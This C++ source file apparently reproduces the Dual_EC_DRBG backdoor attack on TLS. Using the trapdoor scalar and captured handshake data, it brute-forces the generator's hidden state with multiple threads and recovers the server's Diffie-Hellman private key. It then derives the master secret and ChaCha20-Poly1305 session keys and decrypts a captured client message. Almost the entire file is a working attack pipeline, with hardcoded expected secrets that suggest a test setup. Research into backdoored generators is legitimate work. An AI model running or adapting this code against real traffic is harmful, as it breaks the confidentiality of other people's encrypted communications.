#include "commons.h"
#include "bitstr.h"
#include "forward.h"
#include "input.h"
#include "dualec_curve.h"
#include "mbedtls/cipher.h"
#include <array>
#include <bits/stdint-uintn.h>
#include <cstdlib>
#include <gmp++/gmp++_int.h>
#include <iomanip>
#include <ios>
#include <iostream>
#include <string>
#include <vector>
#include <mbedtls/ssl.h>
#include "dualec.h"
#include <queue>
#include <future>

#define TLS_ATTACK_DETERMINISTIC

constexpr auto MASTER_SECRET_LEN = 48;

static auto* cipher_info = mbedtls_cipher_info_from_type(MBEDTLS_CIPHER_CHACHA20_POLY1305);
static BigInt no_of_threads = 29;

barr expect_premaster ={0xdb, 0x39, 0xe0, 0xb2, 0x91, 0x1c, 0x20, 0x7d, 0xdb, 0xf5, 0x2d, 0x6a, 0xac, 0x47, 0x29, 0xdf, 0xfe, 0x41, 0x70, 0xf0, 0x32, 0xe5, 0x55, 0x0d, 0x4f, 0x73, 0x94, 0xcc, 0xc3, 0x40, 0x7f, 0xf9, 0xcc, 0x15, 0x4a, 0x43, 0xa3, 0x4e, 0xbc, 0xe1, 0x52, 0x43, 0x8f, 0x8e, 0xc8, 0x68, 0x5d, 0x46, 0x0e, 0x0f, 0x48, 0x7d, 0x3f, 0x4f, 0x18, 0x24, 0x78, 0xf9, 0x8b, 0x7e, 0x56, 0x57, 0xa0, 0xca, 0xe9, 0x92, 0xa1, 0xec, 0xde, 0xe6, 0x1b, 0xab, 0xfb, 0x98, 0x9a, 0x89, 0xf1, 0x30, 0xb6, 0x79, 0xaf, 0x15, 0x67, 0x07, 0xe6, 0x09, 0x86, 0x90, 0xc0, 0x16, 0xa6, 0xf6, 0x22, 0x6d, 0x68, 0x05, 0x39, 0xba, 0x80, 0x1e, 0x78, 0xfc, 0x86, 0xce, 0xc0, 0xe7, 0xf6, 0xb3, 0x5e, 0xdb, 0xcc, 0x96, 0xfa, 0x24, 0x2c, 0xe1, 0x4f, 0x29, 0x24, 0xfc, 0xd1, 0x9d, 0xb4, 0x92, 0xe3, 0xd0, 0x01, 0xad, 0xc6, 0x39, 0xa5, 0x30, 0x47, 0x9b, 0x00, 0x6a, 0xe0, 0xa2, 0xa6, 0xc7, 0x15, 0xd9, 0x2f, 0xd8, 0x74, 0xd3, 0xd3, 0x9c, 0xb8, 0x54, 0xb7, 0x4e, 0x6c, 0xc0, 0x1e, 0xd4, 0x50, 0x47, 0x1c, 0x47, 0x2e, 0x6c, 0xb2, 0x09, 0x8b, 0xfb, 0x23, 0x2f, 0x19, 0x33, 0xde, 0xe5, 0x0a, 0xa8, 0x68, 0xfd, 0xf9, 0x63, 0x1f, 0x9f, 0x47, 0xdc, 0x2b, 0x5c, 0x24, 0x2b, 0x9b, 0x7d, 0xdd, 0xe2, 0x59, 0x76, 0x60, 0x8a, 0x3e, 0xf4, 0x91, 0xbe, 0xa6, 0x53, 0x8f, 0xcf, 0xa3, 0xa3, 0xd3, 0x97, 0xf5, 0xdf, 0x31, 0xaa, 0xc4, 0x42, 0x51, 0x25, 0xda, 0xe7, 0x8b, 0xfa, 0xcc, 0x02, 0xed, 0x9e, 0x35, 0x04, 0xee, 0xef, 0x3b, 0x63, 0x5c, 0xa7, 0x88, 0x84, 0x84, 0xfd, 0xab, 0x22, 0x96, 0x2b, 0x6d, 0xdb, 0x87, 0xf9, 0x37, 0x0f, 0xe8, 0x18, 0x39, 0x15, 0x7d, 0x24, 0xb5, 0x59, 0x13, 0x34, 0x49, 0x56};
barr expect_master_secret={0xac, 0xbe, 0x54, 0x3f, 0x17, 0x2f, 0xcf, 0x9a, 0x8a, 0x47, 0x97, 0xdc, 0x24, 0xc4, 0xc0, 0x2e, 0x6b, 0x22, 0xeb, 0x45, 0x9d, 0x4a, 0x0f, 0x17, 0x87, 0xed, 0x54, 0x13, 0x21, 0xce, 0x11, 0x4b, 0x7f, 0xea, 0xb0, 0x20, 0x3f, 0x4a, 0x43, 0x3d, 0x7e, 0xc3, 0x70, 0x5e, 0xdd, 0x1a, 0x6f, 0x90};
barr expect_random_bytes={0x64, 0x71, 0xed, 0x63, 0x1a, 0x1a, 0x1a, 0x1a, 0x1a, 0x1a, 0x1a, 0x1a, 0x1a, 0x1a, 0x1a, 0x1a, 0x1a, 0x1a, 0x1a, 0x1a, 0x1a, 0x1a, 0x1a, 0x1a, 0x1a, 0x1a, 0x1a, 0x1a, 0x1a, 0x1a, 0x1a, 0x1a, 0x64, 0x71, 0xed, 0x63, 0x1b, 0x1b, 0x1b, 0x1b, 0x1b, 0x1b, 0x1b, 0x1b, 0x1b, 0x1b, 0x1b, 0x1b, 0x1b, 0x1b, 0x1b, 0x1b, 0x1b, 0x1b, 0x1b, 0x1b, 0x1b, 0x1b, 0x1b, 0x1b, 0x1b, 0x1b, 0x1b, 0x1b};
barr expect_keyblock={0xaa, 0x3d, 0x18, 0x0e, 0x48, 0xe8, 0xf0, 0x89, 0x9c, 0x52, 0x9f, 0x70, 0x7f, 0x82, 0x56, 0xf8, 0xc3, 0xf7, 0x1c, 0xc2, 0xcf, 0xbb, 0x4a, 0xa0, 0x8e, 0x62, 0xcd, 0x82, 0x4d, 0x22, 0xe2, 0x2e, 0xa0, 0xfc, 0xea, 0xdb, 0x6e, 0xc6, 0x01, 0xab, 0xd5, 0xcb, 0xf2, 0x1f, 0xdf, 0x32, 0x5b, 0x52, 0xf9, 0xff, 0x0f, 0x7a, 0xb7, 0x7b, 0x41, 0x11, 0x07, 0xf7, 0xc3, 0x0b, 0x76, 0x72, 0x18, 0xe8, 0x39, 0x37, 0xb9, 0x5d, 0x63, 0xf4, 0x15, 0x45, 0xb2, 0x3a, 0xe8, 0xff, 0x92, 0x41, 0x9c, 0xdc, 0x6c, 0xdd, 0x9b, 0xe1, 0xbd, 0x0d, 0xd1, 0xeb, 0x80, 0xd0, 0x26, 0xa3, 0x7a, 0xb5, 0xd8, 0x67, 0xc6, 0x35, 0x4a, 0xad, 0xee, 0x93, 0xeb, 0xd3, 0xfc, 0x32, 0x55, 0xc0, 0x80, 0x58, 0xb3, 0xea, 0x51, 0x2c, 0x3d, 0x98, 0xee, 0x82, 0x83, 0x8e, 0xdb, 0xdc, 0x57, 0x2c, 0x29, 0xe3, 0x4f, 0xa0, 0x61, 0x1c, 0x3b, 0xe6, 0x79, 0x86, 0x5e, 0x12, 0x55, 0x9a, 0x75, 0x2c, 0xad, 0x18, 0xd9, 0xbc, 0x52, 0xfe, 0x05, 0x9e, 0xd1, 0xd7, 0xff, 0x25, 0xa0, 0xfd, 0xe7, 0x77, 0x90, 0x6b, 0x6d, 0xc3, 0x58, 0x87, 0x70, 0xe9, 0x87, 0x04, 0xea, 0xa8, 0xaf, 0x2e, 0x58, 0xe6, 0x49, 0x86, 0xb6, 0x3f, 0xe8, 0x78, 0x61, 0x38, 0x3c, 0x65, 0x5a, 0xbf, 0xca, 0x13, 0xed, 0x74, 0x89, 0x99, 0x6a, 0xd0, 0x00, 0x16, 0x56, 0x13, 0x28, 0x86, 0x34, 0x02, 0x70, 0x50, 0xf2, 0x89, 0x18, 0x32, 0x82, 0xcc, 0xcb, 0x5d, 0x62, 0xff, 0xf1, 0xca, 0xdf, 0x0d, 0x95, 0xd2, 0xfe, 0xb3, 0x7e, 0x5a, 0xd5, 0x86, 0xff, 0xe9, 0x7f, 0xcc, 0x73, 0xc5, 0xc3, 0x18, 0x9b, 0xd2, 0xfc, 0x5d, 0x05, 0xd6, 0x12, 0xb0, 0x03, 0x14, 0x40, 0x44, 0x81, 0x66, 0x14, 0x81, 0x3a, 0x1b, 0x28, 0x0e, 0x5a, 0x60, 0x13, 0xc3};


void remove_leading_zero_bytes(barr& input)
{
    while (!input.empty() && input.front() == 0)
        input.erase(input.begin());
}

barr prf(barr secret, std::string label, barr seed, size_t dst_len)
{
    barr dst;
    dst.resize(dst_len);
    auto ret = mbedtls_ssl_tls_prf(MBEDTLS_SSL_TLS_PRF_SHA256,
            &secret.front(), secret.size(),
            label.c_str(),
            &seed.front(), seed.size(),
            &dst.front(), dst.size());
    if (ret != 0) {
        std::cout << "mbedtls_ssl_tls_prf returned " << ret << std::endl;
        abort();
    }
    return dst;
}

/* See https://tools.ietf.org/html/rfc5246#section-8.1 */
[[nodiscard]] barr calculate_master_secret(barr const& pre_master_secret, barr const& server_hello_random, barr const& client_hello_random)
{
    barr random;
    random.insert(random.end(), client_hello_random.begin(), client_hello_random.end());
    random.insert(random.end(), server_hello_random.begin(), server_hello_random.end());
    return prf(pre_master_secret, "master secret", random, MASTER_SECRET_LEN);
}

static void print_barr(barr input)
{
    for (auto const& b : input)
        std::cout << std::hex << std::setw(2) << std::setfill('0') << static_cast<int>(b) << " ";
}

struct WorkingKeys {
    barr client_write_key;
    barr server_write_key;
    barr server_enc_iv;
    barr client_enc_iv;

    void print() const
    {
        std::cout << "working_keys: ";
        std::cout << "\n\tclient_write_key: ";
        print_barr(client_write_key);
        std::cout << "\n\tserver_write_key: ";
        print_barr(server_write_key);
        std::cout << "\n\tiv_enc: ";
        print_barr(server_enc_iv);
        std::cout << "\n\tiv_dec: ";
        print_barr(client_enc_iv);
        std::cout << std::endl;
    }
};

WorkingKeys generate_working_keys(barr master_secret, barr random_seed)
{
    WorkingKeys wk;
    barr keyblk = prf(master_secret, "key expansion", random_seed, 256);
    // TODO maybe old Observed testcase keylen: 32, minlen: 16, ivlen: 12, maclen: 0

    auto keylen = cipher_info->key_bitlen / 8;
    auto ivlen = cipher_info->iv_size;
    auto mac_key_len = 0;
    decltype(auto) blkptr = &keyblk.front();
    auto mac_dec = blkptr;
    auto mac_enc = blkptr + mac_key_len;
    auto key_dec = blkptr + mac_key_len * 2;
    auto key_enc = blkptr + mac_key_len * 2 + keylen;

    auto iv_copy_len = ivlen;

    wk.server_write_key.insert(wk.server_write_key.begin(), key_enc, key_enc + keylen);
    wk.client_write_key.insert(wk.client_write_key.begin(), key_dec, key_dec + keylen);
    wk.client_enc_iv.insert(wk.client_enc_iv.begin(), key_enc + keylen, key_enc + keylen + iv_copy_len);
    wk.server_enc_iv.insert(wk.server_enc_iv.begin(), key_enc + keylen + iv_copy_len, key_enc + keylen + iv_copy_len + iv_copy_len);

    /* NOTE: Macs are left out, bc maclen = 0 */
    return wk;
}

barr encrypt(WorkingKeys wk, barr data, barr add_data) {
    constexpr auto taglen = 16;

    mbedtls_cipher_context_t c;
    mbedtls_cipher_init(&c);
    mbedtls_cipher_setup(&c, cipher_info);
    mbedtls_cipher_set_iv(&c, &wk.server_enc_iv.front(), wk.server_enc_iv.size());
    mbedtls_cipher_setkey(&c, &wk.server_write_key.front(), wk.server_write_key.size()*8, MBEDTLS_ENCRYPT);
    // mbedtls_cipher_setkey(&c, &wk.client_write_key.front(), wk.client_write_key.size()*8, MBEDTLS_DECRYPT);

    barr output;
    output.resize(data.size() + taglen);
    size_t olen = 0;
    mbedtls_cipher_auth_encrypt_ext(&c,
                                    &wk.server_enc_iv.front(), wk.server_enc_iv.size(),
                                    &add_data.front(), add_data.size(),
                                    &data.front(), data.size(), /* src */
                                    &output.front(), output.size(), /* dst */
                                    &olen, taglen);
#ifdef TLS_ATTACK_DETERMINISTIC
    std::cout << "Encrypted: ";
    print_barr(output);
    std::cout << std::endl;
#endif
    return output;
}

barr decrypt(WorkingKeys wk, barr enc_input, barr ad_input, barr iv_input, size_t decrypted_len)
{
    std::cout << ">>> decrypt\n\t";
    print_barr(enc_input);
    std::cout << "\n\t";
    print_barr(ad_input);
    std::cout << "\n\t";
    print_barr(iv_input);
    std::cout << std::endl;

    mbedtls_cipher_context_t c;
    mbedtls_cipher_init(&c);
    mbedtls_cipher_setup(&c, cipher_info);
    mbedtls_cipher_set_iv(&c, &wk.server_enc_iv.front(), wk.server_enc_iv.size());
    // mbedtls_cipher_setkey(&c, &wk.server_write_key.front(), wk.server_write_key.size()*8, MBEDTLS_ENCRYPT);
    mbedtls_cipher_setkey(&c, &wk.client_write_key.front(), wk.client_write_key.size()*8, MBEDTLS_DECRYPT);

    barr dec_output;
    dec_output.resize(decrypted_len);
    size_t olen;
    mbedtls_cipher_auth_decrypt_ext(&c,
            &iv_input.front(), iv_input.size(),
            &ad_input.front(), ad_input.size(),
            &enc_input.front(), enc_input.size(),
            &dec_output.front(), dec_output.size(),
            &olen, 16);
#ifdef TLS_ATTACK_DETERMINISTIC
    #endif
    return dec_output;
}

void print_cipher_info()
{
    std::cout << std::dec << "Used cipher: ";
    std::cout << "\n\tname: " << cipher_info->name;
    std::cout << "\n\tkeylen: " << cipher_info->key_bitlen;
    std::cout << "\n\tiv-size: " << cipher_info->iv_size;
    std::cout << std::endl;
}

void calculate_s_from_r(BitStr& opt1, BitStr& opt2, BigInt const& r, Input const& input)
{
    AffinePoint R1, R2;
    input.dec_curve.curve.lift_x(R1, R2, r);
     //  it holds that s2 = x(d * R)
    if (!R1.is_identity())
        opt1 = BitStr(DEC::mul(input.dec_secret_d, R1, input.dec_curve.curve).x(), DEC::pick_seedlen(input.dec_security_strength));
    if (!R2.is_identity())
        opt2 = BitStr(DEC::mul(input.dec_secret_d, R2, input.dec_curve.curve).x(), DEC::pick_seedlen(input.dec_security_strength));
}

BitStr bitstr_from_barr(barr input)
{
    BitStr out = BitStr(0);
    for (auto const& b : input)
        out = out + BitStr(BigInt(b), 8);
    return out;
}

std::optional<BigInt> try_calc_private_key(BitStr const& guessed_stripped_bits, BitStr const& validify_bits, BitStr const& inner_dec_serv_rand, Input const& input, DEC::WorkingState& working_state)
{
    BitStr guessed_r = guessed_stripped_bits + inner_dec_serv_rand;
    /* Step 3: Calculate the next state s_(i+1) */
    BitStr s_opt1 = BitStr(0), s_opt2 = BitStr(0); // default
    calculate_s_from_r(s_opt1, s_opt2, guessed_r.as_big_int(), input);

    for (auto const& s : {s_opt1, s_opt2}) {
        if (s.as_big_int() == 0)
            continue;
        working_state.s = BitStr(std::move(s));
        /* Step 3.1: Generate server-session-id last 2 bytes */
        auto to_validify = BitStr(DEC::mul(working_state.s.as_big_int(), working_state.dec_curve.Q, working_state.dec_curve.curve).x())
            .truncated_rightmost(working_state.outlen)
            .truncated_leftmost(2*8);
        if (to_validify.as_big_int() != validify_bits.as_big_int())
            continue;
        working_state.s = BitStr(DEC::mul(working_state.s.as_big_int(), working_state.dec_curve.P, working_state.dec_curve.curve).x(), working_state.seedlen);
        std::cout << "\nPossible s found: " << working_state.s.as_hex_string() << std::endl;
        /* Step 4: Generate enough random bits for a. Calculate a by subtracting 1 from the bits */
        auto a_bits = DEC::Generate(working_state, input.dh_bitlen_of_a, input.dec_adin);
        auto a = a_bits.as_big_int() - 1;
        /* Step 5: Calculate g^a (mod p) and check if it matches pubKeyServer
         *         If it didn't go to step 2.*/
        auto ga = Givaro::powmod(input.dh_generator, a, input.dh_prime);
        if (ga == input.dh_pubkey_server)
            return a;
    }
    return {};
}

struct Iterator {
    Iterator(BigInt start, BigInt end_excl)
        : m_start(std::move(start))
        , m_end(std::move(end_excl))
        , m_current(m_start)
    {
    }
    BigInt m_start;
    BigInt m_end;
    [[nodiscard]] BigInt current() const { if (m_current >= m_end) abort();
        return m_current; }
    [[nodiscard]] bool has_next() const { return m_current + 1 < m_end; }
    BigInt advance() {
        return m_current++; }
    [[nodiscard]] int percentage() const { return (current()-m_start+2)*100 / (m_end-m_start); }
private:
    BigInt m_current;
};

static std::queue<std::shared_future<std::optional<BitStr>>> workers;
static std::vector<int> finished_worker;
static std::vector<int> progess;

static void push_worker(std::function<std::optional<BitStr>()> func)
{
    workers.push(std::async(std::launch::async, func));
}

BigInt guess_server_private_key(BitStr const& inner_dec_serv_rand, BitStr const& validify_bits, Input const& input)
{
    std::stop_source stop_source;

    auto stripped_amount_of_bits = DEC::pick_seedlen(input.dec_security_strength) - DEC::calculate_max_outlen(DEC::pick_seedlen(input.dec_security_strength));

    std::cout << "Amount of bits to brute force: " << stripped_amount_of_bits << std::endl;
    /* Step 2: Guess the last 4 bytes (because they were stripped to make room for the unix timestamp)
     *         and the stripped bits from the front */
    auto strip_bound = BigInt(1) << stripped_amount_of_bits;
    auto strip_per_thread = strip_bound / no_of_threads;

    progess.resize(no_of_threads);
    finished_worker.resize(no_of_threads);
    auto* progress_bucket = &progess[0];
    auto* finish_bucket = &finished_worker[0];
    for (BigInt thread_start(0), thread_end(strip_per_thread); thread_end <= strip_bound; thread_end += strip_per_thread, thread_start += strip_per_thread, ++progress_bucket, ++finish_bucket) {
        auto lambda = [&validify_bits, progress_bucket,finish_bucket, &stop_source, thread_start, thread_end, stripped_amount_of_bits, &inner_dec_serv_rand, &input]() -> std::optional<BitStr> {
             auto working_state = DEC::WorkingState {
                .s = BitStr(-1),
                .seedlen = DEC::pick_seedlen(input.dec_security_strength),
                .dec_curve = input.dec_curve,
                .outlen = DEC::calculate_max_outlen(DEC::pick_seedlen(input.dec_security_strength))};
            auto guesser = Iterator(thread_start, thread_end);
            auto stoken = stop_source.get_token();
            while (guesser.has_next() && !stoken.stop_requested()) {
                *progress_bucket = guesser.percentage();
                auto guess = BitStr(guesser.advance(), stripped_amount_of_bits);
                auto result = try_calc_private_key(guess, validify_bits, inner_dec_serv_rand, input, working_state);
                if (result.has_value()) {
                    stop_source.request_stop();
                    *finish_bucket = 1;
                    return result;
                }
            }
            *finish_bucket = 1;
            return {};
        };
        push_worker(lambda);
    }

    std::cout << "Progress:" << std::endl;
    for (size_t i = 0; i < no_of_threads; ++i)
        std::cout << " T" << std::setfill('0') << std::setw(2) << i << " ";
    std::cout << std::endl;
    auto stoken = stop_source.get_token();
    while (!stoken.stop_requested()) {
        bool all_done = true;
        for (auto const& f : finished_worker)
            if (!f)
                all_done = false;
        if (all_done)
            break;
        std::cout << "\r";
        for (auto const& p : progess)
            std::cout << std::setfill(' ') << std::right << std::setw(3) << p << "% ";
        std::cout << std::flush;
        std::this_thread::sleep_for(std::chrono::milliseconds(250));
    }
    std::cout << std::endl;


    while (!workers.empty()) {
        auto ret = workers.front().get(); // blocking until finished by stop_source
        if (ret.has_value()) {
            while (!workers.empty())
                workers.pop();
            return ret.value().as_big_int();
        }
        workers.pop();
    }
    std::cout << "Unexpected end of brute force" << std::endl;
    abort();
}

barr aead_from_contentlen(size_t content_length)
{
    size_t message_len = content_length - 16;
    /* content = record - header */
    barr aead = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x17, 0x03, 0x03, 0xaa, 0xaa};
    aead[aead.size() - 2] = (message_len & 0xff00) >> 8;
    aead[aead.size() - 1] = message_len & 0xff;
    return aead;
}

int main()
{
    auto input = setup_input();
    /* Input:
     *      TLS: server-random, client-random, server-session-id
     *      DH: generator, prime, bitlength of a (TODO: not transferred, but maybe inferred?), pubKeyServer = g^a (mod p), pubKeyClient = g^b (mod p).
     *      DualEC: security-stength, Q, d, s.t. dQ = P, adins used for generating, personalization string
     * Assumption:
     *      server used DualEC to generate server-random and (a+1),
     *      for now: used cipher: MBEDTLS_CIPHER_CHACHA20_POLY1305
     */
    /* Step 1: Take the first 30 bytes of server-session-id (for 128 security strength) */
    BitStr inner_dec_serv_rand = bitstr_from_barr(barr(input.server_session_id.begin(), input.server_session_id.begin() + 30));
    BitStr validify_bits = bitstr_from_barr(barr(input.server_session_id.begin() + 30, input.server_session_id.begin() + 32));
    BigInt server_private = guess_server_private_key(inner_dec_serv_rand, validify_bits, input);
    std::cout << "SUCCESS!!! server private key is:\n\t" << bigint_hex(server_private) << std::endl;
    /* Step 6: Calculate the pre-master-secret with pubKeyClient^a (mod p) */
    auto pms = Givaro::powmod(input.dh_pubkey_client, server_private, input.dh_prime);
    auto pms_arr = BitStr(pms).to_baked_array();
    auto pre_master_secret = barr(pms_arr.data(), pms_arr.data() + pms_arr.size());
    /* Step 7: Calculate the master secret with the given information */
    remove_leading_zero_bytes(pre_master_secret);
    auto master_secret = calculate_master_secret(pre_master_secret, input.server_random, input.client_random);
    /* Step 8: Calculate the working_keys and decrpyt the message */
    barr random_;
    random_.insert(random_.end(), input.server_random.begin(), input.server_random.end());
    random_.insert(random_.end(), input.client_random.begin(), input.client_random.end());
    auto working_keys = generate_working_keys(master_secret, random_);
    working_keys.print();

    /* AEAD = message_len. record = header + encrypted_message + tag (16 bytes) */
    auto aead = aead_from_contentlen(input.msg_container.size());

    auto decrypt_buffer_len = 128;
    auto iv = bitstr_from_barr(working_keys.client_enc_iv).as_big_int() - input.msg_iv_offset;
    auto iv_arr = BitStr(iv, cipher_info->iv_size*8).to_baked_array();
    auto iv_barr = barr(iv_arr.data(), iv_arr.data() + iv_arr.size());
    // encrypt(working_keys, {}, {});
    auto decrypted = decrypt(working_keys, input.msg_container, aead, iv_barr, decrypt_buffer_len);
    std::cout << "Client decrypted: ";
    print_barr(decrypted);
    std::cout << std::endl;
    std::cout << "ASCII: ";
    for (auto const& o : decrypted)
        std::cout << o;
    std::cout << std::endl;

    return 0;
}
